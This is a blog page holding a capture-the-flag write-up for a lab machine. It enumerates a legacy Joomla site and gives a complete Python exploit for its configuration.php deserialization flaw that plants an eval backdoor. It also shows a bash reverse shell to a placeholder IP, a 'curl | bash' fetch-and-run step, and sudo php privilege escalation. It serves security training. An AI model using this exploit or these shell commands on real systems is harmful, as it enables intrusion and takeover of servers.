<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="FmF" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="FmF" /> <title> Pet shop (Parrot CTF) - FmF </title> <link rel="alternate" href="http://localhost:4000/ParrotCtf-Pet_Shop/" hreflang="en-US" /> <link rel="canonical" href="http://localhost:4000/ParrotCtf-Pet_Shop/" /> <meta name="description" content="This is a personal blog about a hacking and other stuff." /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="Pet shop (Parrot CTF) | FmF" /> <meta property="og:title" content="Pet shop (Parrot CTF) | FmF" /> <meta property="og:type" content="website" /> <meta property="og:url" content="http://localhost:4000/ParrotCtf-Pet_Shop/" /> <meta property="og:description" content="This is a personal blog about a hacking and other stuff." /> <meta property="og:image" content="http://localhost:4000/ParrotCtf-Pet_Shop/banner.jpg" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="Pet shop (Parrot CTF) | " /> <meta name="twitter:url" content="http://localhost:4000/ParrotCtf-Pet_Shop/" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:description" content="This is a personal blog about a hacking and other stuff." /> <meta name="twitter:image" content="http://localhost:4000/ParrotCtf-Pet_Shop/banner.jpg" /> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="FmF" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> <!-- for mathjax support --> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">Home</a><a class="menu-link" href="/archive/">Archive</a><a class="menu-link" href="/about/">About</a></a> </div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <div class="tags"> <span itemprop="keywords"> <a class="tag" href="/tags/#unix-linux">UNIX/LINUX</a>, <a class="tag" href="/tags/#parrot-ctf">PARROT CTF</a> </span> </div> <h1 class="header-title" itemprop="headline">Pet shop (Parrot CTF)</h1> <div class="post-meta"> <time datetime="2023-08-19T05:00:00+00:00" itemprop="datePublished"> Aug 19, 2023 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">FmF</span> </span> <time hidden datetime="" itemprop="dateModified"> Aug 19, 2023 </time> <span hidden itemprop="publisher" itemtype="Person">FmF</span> <span hidden itemprop="image">/ParrotCtf-Pet_Shop/banner.jpg</span> <span hidden itemprop="mainEntityOfPage"><p><img src="/ParrotCtf-Pet_Shop/images/1.png" alt="Joomla banner" /></p> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <p><img src="/ParrotCtf-Pet_Shop/images/1.png" alt="Joomla banner" /></p> <p>ü¶ú <a href="https://parrot-ctfs.com/">Parrot CTFs</a> is an advanced cybersecurity education platform and capture the flag provider. Their goal is to create the most realistic capture the flag challenges and demonstrate real-world attack scenarios.</p> <p>This is an easy difficulty machine that exploits a legacy Joomla Content Management System (CMS) and a binary that has SUID permissions to gain root privileges.</p> <h2 id="content"> <a href="#content" class="anchor-head"></a> Content: </h2> <ul> <li><a href="#enumeration-">Enumeration</a></li> <li><a href="#easy-way-%EF%B8%8F">Easy way</a></li> <li><a href="#not-too-easy-way-%EF%B8%8F">Not too easy way</a></li> <li><a href="#privilege-escalation-">Privilege escalation</a></li> </ul> <h2 id="enumeration-"> <a href="#enumeration-" class="anchor-head"></a> Enumeration üîé: </h2> <p>We start by using <code class="language-plaintext highlighter-rouge">ping</code> to check the <em>TTL</em> of the machine to determine the OS we are dealing with.</p> <p><img src="/ParrotCtf-Pet_Shop/images/2.png" /></p> <p>Based on the <em>TTL</em> value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href="https://ostechnix.com/identify-operating-system-ttl-ping/">Identify OS using TTL value</a>.</p> <p>Now, let‚Äôs go with an <code class="language-plaintext highlighter-rouge">nmap</code> scan to view the open ports.</p> <p><code class="language-plaintext highlighter-rouge">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.65 -oN allPorts</code></p> <p><code class="language-plaintext highlighter-rouge">-p-</code> ‚Äì&gt; We are doing a scan against all 65535 ports to search for open ports.</p> <p><code class="language-plaintext highlighter-rouge">--open</code> ‚Äì&gt; It will only report open ports.</p> <p><code class="language-plaintext highlighter-rouge">-sS</code> ‚Äì&gt; It can be performed quickly, scanning thousands of ports per second.</p> <p><code class="language-plaintext highlighter-rouge">--min-rate 5000</code> ‚Äì&gt; It sets the minimum rate of packets sent per second to 5000.</p> <p><code class="language-plaintext highlighter-rouge">-n</code> ‚Äì&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p> <p><code class="language-plaintext highlighter-rouge">-v</code> ‚Äì&gt; It will be verbose in its output.</p> <p><code class="language-plaintext highlighter-rouge">-Pn</code> ‚Äì&gt; This option skips the host discovery stage.</p> <p><code class="language-plaintext highlighter-rouge">-oN</code> ‚Äì&gt; It will save the output in a file called ‚ÄúallPorts‚Äù.</p> <p>We find out the following open ports:</p> <p><img src="/ParrotCtf-Pet_Shop/images/3.png" /></p> <p>Let‚Äôs take a look at what the page has.</p> <p><img src="/ParrotCtf-Pet_Shop/images/4.png" /></p> <p>We can see some posts and a user joomla who wrote the posts.</p> <p>Let‚Äôs use <a><code class="language-plaintext highlighter-rouge">Wappalyzer</code></a> to detect more information about what tecnologies the page is using.</p> <p><img src="/ParrotCtf-Pet_Shop/images/5.png" /></p> <p>We can see that the Content Management System (CMS) is Joomla, what is a for publishing web content like WordPress and others. Now that we know the CMS, we can search for any administration panel and try default creds. Maybe we have luck :), a quick search in Google show us that the directory for the admin panel is <a href="https://docs.joomla.org/Administrator_(Application)"><code class="language-plaintext highlighter-rouge">/administrator</code></a>. We can try to view it going to: <code class="language-plaintext highlighter-rouge">http://10.14.0.65/joomla/administrator</code></p> <p><img src="/ParrotCtf-Pet_Shop/images/6.png" /></p> <p>By default, the username is <code class="language-plaintext highlighter-rouge">admin</code> and the password must be defined in the installation progress. We can try login with the user that we find earlier: ‚Äújoomla:joomla‚Äù but it doesn‚Äôt work, so‚Ä¶ lets put this aside and continue doing other things.</p> <p>We can use <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla">HackTricks</a> to search for commons ways to enumerate joomla and try to exploit it, first lets try to search the version.</p> <p><img src="/ParrotCtf-Pet_Shop/images/7.png" /></p> <p>Going to the directory <a><code class="language-plaintext highlighter-rouge">/language/en-GB/en-GB.xml</code></a> we can see the version of the CMS, now let‚Äôs search for public exploits for this version.</p> <p><img src="/ParrotCtf-Pet_Shop/images/8.png" /></p> <p>We can use <code class="language-plaintext highlighter-rouge">searchsploit</code> to search for exploits and we can find a lot :)</p> <p>There are various ways to solve the machine, an easy one and a not-too-easy one. Let‚Äôs first look at the easy way.</p> <p><img src="/ParrotCtf-Pet_Shop/images/9.png" /></p> <h2 id="easy-way-Ô∏è"> <a href="#easy-way-Ô∏è" class="anchor-head"></a> Easy way üõ£Ô∏è: </h2> <p>Let‚Äôs do more enumeration. We can use <a href="https://vk9-sec.com/wfuzz-how-to/"><code class="language-plaintext highlighter-rouge">wfuzz</code></a> to do fuzzing in the page.</p> <p><img src="/ParrotCtf-Pet_Shop/images/10.png" /></p> <p>We can inspect these directories one by one. We can find that some of them have directory listing capabilities, but we cannot find any useful information‚Ä¶</p> <p>Ok mmm‚Ä¶ Let‚Äôs fuzz for file extensions such as backup files: <a><code class="language-plaintext highlighter-rouge">bak, backup, bck</code></a>‚Ä¶</p> <p><img src="/ParrotCtf-Pet_Shop/images/11.png" /></p> <p>Wow we can see that there is a configuration file <code class="language-plaintext highlighter-rouge">configuration.backup</code>. Let‚Äôs view its contents.</p> <p><img src="/ParrotCtf-Pet_Shop/images/12.png" /></p> <p>The output is ugly so let‚Äôs fix it up. Press <code class="language-plaintext highlighter-rouge">ctrl</code> + <code class="language-plaintext highlighter-rouge">u</code> to view the source code. This will make the output a lot prettier, and we can see a username and password. :)</p> <p><img src="/ParrotCtf-Pet_Shop/images/13.png" /></p> <p>Now we can login to the machine with the credentials that we found with: <code class="language-plaintext highlighter-rouge">ssh ron@10.14.0.65</code>, and we are in.</p> <p><img src="/ParrotCtf-Pet_Shop/images/14.png" /></p> <p>Now that we are inside the machine you need to do one thing to ensure smooth operation:</p> <ol> <li>-&gt; <code class="language-plaintext highlighter-rouge">export TERM=xterm</code></li> </ol> <p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code>.</p> <h2 id="not-too-easy-way-Ô∏è"> <a href="#not-too-easy-way-Ô∏è" class="anchor-head"></a> Not too easy way üõ£Ô∏è: </h2> <p>Let‚Äôs go back a bit and look the available exploits.</p> <p><img src="/ParrotCtf-Pet_Shop/images/8.png" /></p> <p>In this case, I am going to use the exploit with the title: <a><code class="language-plaintext highlighter-rouge">3.4.6 - 'configuration.php' Remote Code Execution</code></a>. You can find all the technical details <a href="https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/">here</a>.</p> <p>You can use <code class="language-plaintext highlighter-rouge">searchsploit -x php/webapps/47465.py</code> to inspect the source of the exploit, and if you want to copy it to your local directory, you can use: <code class="language-plaintext highlighter-rouge">searchsploit -m php/webapps/47465.py .</code></p> <p>If you execute it, it will tell you that it is not vulnerable. However, in reality, it is vulnerable.</p> <p><img src="/ParrotCtf-Pet_Shop/images/15.png" /></p> <p>This is where things get complicated. You need to modify and test the exploit using Burp Suite. If you want to understand how this really works, view the <a href="https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/">technical details</a>. But to keep this write-up from getting too long, I‚Äôm going to give you my script to exploit it.</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/bin/python3</span>

<span class="n">import</span> <span class="n">requests</span> <span class="n">as</span> <span class="n">r</span><span class="p">,</span> <span class="n">string</span><span class="p">,</span> <span class="n">random</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">sys</span>
<span class="n">from</span> <span class="n">bs4</span> <span class="n">import</span> <span class="no">BeautifulSoup</span>

<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://10.14.0.65/joomla/"</span>
<span class="c1">#PROXS = {"http":"http://127.0.0.1:8080"}</span>
<span class="no">PROXS</span> <span class="o">=</span> <span class="p">{}</span>

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">num</span><span class="p">):</span>
	<span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">Saliendo...</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
	<span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="no">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">random_string</span><span class="p">(</span><span class="n">stringLength</span><span class="p">):</span>
    <span class="n">letters</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="nf">ascii_lowercase</span>
    <span class="k">return</span> <span class="s1">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">letters</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="n">range</span><span class="p">(</span><span class="n">stringLength</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_backdoor_pay</span><span class="p">():</span> <span class="c1"># This payload will backdoor the the configuration .PHP with an eval on POST request</span>
	<span class="n">function</span> <span class="o">=</span> <span class="s1">'assert'</span>
	<span class="n">template</span> <span class="o">=</span> <span class="s1">'s:3:"FmF";O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'</span>
	<span class="n">payload</span> <span class="o">=</span>  <span class="s1">'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\''</span> <span class="o">+</span> <span class="n">backdoor_param</span> <span class="o">+</span><span class="s1">'\\\'])) eval($_POST[\\\''</span><span class="o">+</span><span class="n">backdoor_param</span><span class="o">+</span><span class="s1">'\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'</span>
	<span class="n">function_len</span> <span class="o">=</span> <span class="n">len</span><span class="p">(</span><span class="n">function</span><span class="p">)</span>
	<span class="n">final</span> <span class="o">=</span> <span class="n">template</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="s1">'PAYLOAD'</span><span class="p">,</span><span class="n">payload</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="s1">'LENGTH'</span><span class="p">,</span> <span class="n">str</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))).</span><span class="nf">replace</span><span class="p">(</span><span class="s1">'FUNC_NAME'</span><span class="p">,</span> <span class="n">function</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="s1">'FUNC_LEN'</span><span class="p">,</span> <span class="n">str</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="n">function</span><span class="p">)))</span>
	<span class="k">return</span> <span class="n">final</span>

<span class="k">def</span> <span class="nf">request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
	<span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="no">Session</span><span class="p">()</span>
	<span class="n">page</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">'index.php/login'</span><span class="p">)</span>
	<span class="n">soup</span> <span class="o">=</span> <span class="no">BeautifulSoup</span><span class="p">(</span><span class="n">page</span><span class="p">.</span><span class="nf">content</span><span class="p">,</span> <span class="s2">"html.parser"</span><span class="p">)</span>

	<span class="n">values</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find_all</span><span class="p">(</span><span class="s2">"input"</span><span class="p">)</span>

	<span class="n">csrf</span> <span class="o">=</span> <span class="n">values</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># Gets the CSRF token value</span>
	<span class="n">ok</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="s1">'name="(.*?)"'</span><span class="p">,</span> <span class="n">str</span><span class="p">(</span><span class="n">csrf</span><span class="p">))</span>
	<span class="n">csrf</span> <span class="o">=</span> <span class="n">ok</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s1">'index.php/login?task=user.login'</span>

	<span class="n">return_value</span> <span class="o">=</span> <span class="n">values</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="c1"># Gets the return value</span>
	<span class="n">ok</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="s1">'value="(.*?)"'</span><span class="p">,</span> <span class="n">str</span><span class="p">(</span><span class="n">return_value</span><span class="p">))</span>
	<span class="n">return_value</span> <span class="o">=</span> <span class="n">ok</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

	<span class="n">user_payload</span> <span class="o">=</span> <span class="s1">'\\0\\0\\0'</span> <span class="o">*</span> <span class="mi">9</span>
	<span class="n">inj_object</span> <span class="o">=</span> <span class="s1">'";'</span>
	<span class="n">inj_object</span> <span class="o">+=</span> <span class="n">payload</span>
	<span class="n">inj_object</span> <span class="o">+=</span> <span class="s1">'s:6:"return";s:102:'</span> <span class="c1"># end the object with the 'return' part</span>
	<span class="n">password_payload</span> <span class="o">=</span> <span class="s1">'AAA'</span> <span class="o">+</span> <span class="n">inj_object</span>

	<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
		<span class="s1">'username'</span><span class="ss">:user_payload</span><span class="p">,</span>
		<span class="s1">'password'</span><span class="ss">:password_payload</span><span class="p">,</span>
		<span class="s1">'return'</span><span class="ss">:return_value</span><span class="p">,</span>
		<span class="n">csrf</span><span class="ss">:'1'</span>
	<span class="p">}</span>

	<span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="no">PROXS</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ping_backdoor</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">param_name</span><span class="p">):</span>
	<span class="k">while</span> <span class="no">True</span><span class="p">:</span>
		<span class="n">command</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">"[RCE]~&gt; "</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">'configuration.php'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="n">param_name</span><span class="ss">:'system(\''</span><span class="o">+</span> <span class="n">command</span> <span class="o">+</span><span class="s1">'\');'</span><span class="p">})</span> <span class="c1"># Here is where the magic happens</span>
		<span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="nf">text</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
	<span class="n">backdoor_param</span> <span class="o">=</span> <span class="n">random_string</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span> <span class="c1">## Generate a unique string for our payload</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="n">get_backdoor_pay</span><span class="p">()</span>
	<span class="nb">print</span><span class="p">(</span><span class="s2">"[+] Backdoor id: "</span> <span class="o">+</span> <span class="n">backdoor_param</span><span class="p">)</span>
	<span class="n">request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
	<span class="nb">print</span><span class="p">(</span><span class="s2">"[+] Backdoor is ready, you can enter now...</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
	<span class="n">ping_backdoor</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">backdoor_param</span><span class="p">)</span>

</code></pre></div></div> <p>Now with this, we can execute commands, but this is NOT a full interactive shell yet.</p> <p><img src="/ParrotCtf-Pet_Shop/images/16.png" /></p> <p>To get an interactive shell, there are a lot of ways to do it, but I‚Äôm going to use this one:</p> <p>Create a file with the name <a><code class="language-plaintext highlighter-rouge">index.html</code></a>, with this content:</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="sr">/dev/</span><span class="n">tcp</span><span class="o">/</span><span class="no">YOUR_IP_HERE</span><span class="o">/</span><span class="mi">443</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
</code></pre></div></div> <p>Now use the command: <code class="language-plaintext highlighter-rouge">sudo python3 -m http.server 80</code> to put a http server where we are sharing our files.</p> <p>And finally use the command <code class="language-plaintext highlighter-rouge">nc -lvnp 443</code> to listen for our reverse connection from our payload above.</p> <p>Now execute the command: <code class="language-plaintext highlighter-rouge">curl YOUR_IP_HERE | bash</code> this is going to get the content of the file <code class="language-plaintext highlighter-rouge">index.html</code> and interpret the content as a bash command.</p> <p><img src="/ParrotCtf-Pet_Shop/images/17.png" /></p> <p>We can see that we get a shell like <code class="language-plaintext highlighter-rouge">www-data</code> user.</p> <p>Now that we are inside the machine you need to do various things to ensure smooth operation:</p> <ol> <li>-&gt; <code class="language-plaintext highlighter-rouge">script /dev/null -c bash</code></li> <li>-&gt; <code class="language-plaintext highlighter-rouge">ctrl + z</code></li> <li>-&gt; <code class="language-plaintext highlighter-rouge">stty raw -echo; fg</code></li> <li>-&gt; <code class="language-plaintext highlighter-rouge">reset xterm</code></li> <li>-&gt; <code class="language-plaintext highlighter-rouge">export TERM=xterm</code></li> </ol> <p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code> and if we do <code class="language-plaintext highlighter-rouge">ctrl + c</code> is not going to kill the shell, more info <a href="https://invertebr4do.github.io/tratamiento-de-tty/#">here</a>.</p> <p><img src="/ParrotCtf-Pet_Shop/images/18.png" /></p> <p>We can see the <code class="language-plaintext highlighter-rouge">configuration.backup</code> file so here we can get the creds of the user <code class="language-plaintext highlighter-rouge">ron</code> and we can connect through SSH.</p> <h2 id="privilege-escalation-"> <a href="#privilege-escalation-" class="anchor-head"></a> Privilege escalation üö©: </h2> <p>Now that we are inside the machine as the <code class="language-plaintext highlighter-rouge">ron</code> user, we need to enumerate the system to find a way to escalate privileges.</p> <p>One thing I always check first is <code class="language-plaintext highlighter-rouge">sudo -l</code>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the <code class="language-plaintext highlighter-rouge">root</code> user.</p> <p>More info about privilege escalation techniques check <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">here.</a></p> <p><img src="/ParrotCtf-Pet_Shop/images/19.png" /></p> <p>We can see something interesting, the binary <a><code class="language-plaintext highlighter-rouge">php</code></a> can be run as the <code class="language-plaintext highlighter-rouge">root</code> user.</p> <p>A quick search in Google tells us that we can escalate privileges with it, search in <a href="https://gtfobins.github.io/gtfobins/php/#suid">GTFOBins</a>.</p> <p><img src="/ParrotCtf-Pet_Shop/images/20.png" /></p> <p>We execute the commands:</p> <p><img src="/ParrotCtf-Pet_Shop/images/21.png" /></p> <p>And now we are root :)</p> <p>Hope you like it and learn something new :)</p> </div> </article> </main> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/ParrotCtf-Blogger/" > <div class="nav-arrow">Previous</div> <span class="post-title">Blogger (Parrot CTF)</span> </a> <a class="post-nav-item post-nav-next" href="/ParrotCtf-Santas_List/"> <div class="nav-arrow">Next</div> <span class="post-title">Santa's List (Parrot CTF)</span> </a> </nav> <footer class="footer"> <span class="footer_item">&copy; 2023</span> <small class="footer_copyright"> Made with üíñ by FmF. </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
